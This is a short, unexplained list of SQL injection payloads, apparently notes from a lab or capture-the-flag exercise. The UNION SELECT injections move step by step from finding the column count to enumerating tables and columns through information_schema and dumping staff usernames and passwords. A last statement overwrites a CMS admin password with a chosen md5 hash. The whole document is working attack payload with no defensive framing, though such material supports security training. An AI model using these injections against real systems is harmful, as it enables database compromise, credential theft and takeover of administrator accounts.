```
1 UNION SELECT 1
```

```
1 UNION SELECT 1,2
```

```
1 UNION SELECT 1,2,3
```

```
0 UNION SELECT 1,2,3
```

```
0 UNION SELECT 1,2,database()
```

```
0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'
```

```
0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'
```

```
0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users
```
```
update cms_users set password = (select md5(CONCAT(IFNULL((SELECT sitepref_value FROM cms_siteprefs WHERE sitepref_name = 'sitemask'),' '), 'caesar'))) where username = 'admin';
```
